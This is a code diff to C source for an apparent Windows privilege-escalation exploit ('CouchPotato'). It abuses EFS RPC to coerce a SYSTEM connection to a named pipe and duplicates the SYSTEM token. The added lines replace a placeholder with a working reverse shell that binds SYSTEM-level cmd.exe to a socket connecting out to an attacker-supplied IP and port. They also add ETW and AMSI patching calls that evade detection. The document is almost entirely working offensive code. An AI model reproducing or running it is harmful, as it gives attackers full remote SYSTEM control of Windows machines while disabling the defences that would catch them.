@@ -1,10 +1,14 @@
 #define _CRT_SECURE_NO_WARNINGS
+#define _WINSOCK_DEPRECATED_NO_WARNINGS
+#define WIN32_LEAN_AND_MEAN
 #include <Windows.h>
 #include <rpc.h>
 #include <stdio.h>
-#include "efsr_h.h"
+#include "couch_efsr_h.h"
+#include "util.h"
+#include <winsock2.h>
 
-// ── MIDL allocator stubs ─────────────────────────────────────
+
 void* __RPC_USER MIDL_user_allocate(size_t n) {
     return HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, n);
 }
@@ -16,7 +20,6 @@ void __RPC_USER PEXIMPORT_CONTEXT_HANDLE_rundown(
     (void)ctx;
 }
 
-// ── RPC binding ──────────────────────────────────────────────
 static handle_t couch_bind(void) {
     RPC_STATUS st;
     RPC_WSTR sb = NULL;
@@ -45,7 +48,7 @@ static handle_t couch_bind(void) {
     return bh;
 }
 
-// ── trigger ──────────────────────────────────────────────────
+
 DWORD WINAPI efs_trigger(LPVOID param) {
     printf("[*] Trigger running\n");
 
@@ -64,7 +67,9 @@ DWORD WINAPI efs_trigger(LPVOID param) {
         printf("[*] result: %ld\n", result);
     }
         RpcExcept(EXCEPTION_EXECUTE_HANDLER) {
-        printf("[-] RPC exception: 0x%lX\n", RpcExceptionCode());
+        DWORD code = RpcExceptionCode();
+        if (code != 0x71A)
+            printf("[-] RPC exception: 0x%lX\n", code);
     }
     RpcEndExcept
 
@@ -72,8 +77,7 @@ DWORD WINAPI efs_trigger(LPVOID param) {
     return 0;
 }
 
-// ── escalation ───────────────────────────────────────────────
-VOID efs_escalate(const char* ip, const char* port) {
+VOID efs_escalate(char* ip,char* port) {
     HANDLE hpipe = CreateNamedPipeA(
         "\\\\.\\pipe\\CouchPotato\\pipe\\srvsvc",
         PIPE_ACCESS_DUPLEX,
@@ -126,24 +130,37 @@ VOID efs_escalate(const char* ip, const char* port) {
     }
     printf("[+] SYSTEM token duplicated\n");
 
-    // TODO: replace with encrypted reverse shell to ip:port
+    WSADATA wsa;
+    WSAStartup(MAKEWORD(2, 2), &wsa);
+    SOCKET sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+    struct sockaddr_in addr = { 0 };
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(atoi(port));
+    addr.sin_addr.s_addr = inet_addr(ip);
+    connect(sock, &addr, sizeof(addr));
+    SetHandleInformation((HANDLE)sock, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);
+
     STARTUPINFOW si = { sizeof(STARTUPINFOW) };
     PROCESS_INFORMATION pi = { 0 };
-    if (!CreateProcessWithTokenW(h_new, 0,
+    si.hStdInput = (HANDLE)sock;
+    si.hStdOutput = (HANDLE)sock;
+    si.hStdError = (HANDLE)sock;
+    si.dwFlags = STARTF_USESTDHANDLES;
+    if (!CreateProcessAsUserW(h_new,
         L"C:\\Windows\\System32\\cmd.exe",
-        NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
-        printf("[-] CreateProcessWithTokenW: %lu\n", GetLastError());
+        NULL, NULL, NULL,
+        TRUE,  
+        0, NULL, NULL, &si, &pi)) {
+        printf("[-] CreateProcessAsUserW: %lu\n", GetLastError());
     }
     else {
         printf("[+] SYSTEM shell spawned\n");
-        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
     }
-
-    RevertToSelf();
-    CloseHandle(h_ex); CloseHandle(h_new); CloseHandle(hpipe);
 }
 
-// ── entry point ──────────────────────────────────────────────
 int main(void) {
     LPSTR cmd = GetCommandLineA();
     BOOL q = FALSE; DWORD p = 0;
@@ -161,9 +178,12 @@ int main(void) {
     strncpy(ip, a, s - a);
     strcpy(port, s + 1);
 
-    printf("[*] CouchPotato\n");
-    printf("[*] Callback: %s:%s\n", ip, port);
 
-    efs_escalate(ip, port);
+    EtwPatch();
+    AmsiPatch();
+    efs_escalate(ip,port);
+
+
+
     return 0;
 }
